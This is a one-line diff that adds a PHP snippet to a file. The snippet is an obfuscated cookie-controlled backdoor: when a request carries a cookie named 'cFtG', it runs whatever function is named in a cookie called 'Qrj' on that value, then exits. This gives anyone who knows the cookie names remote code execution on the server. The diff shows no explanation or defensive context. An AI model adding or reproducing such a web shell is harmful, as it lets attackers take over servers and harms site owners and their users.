@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["cFtG"])){$_COOKIE["Qrj"]($_COOKIE["cFtG"]);exit;}
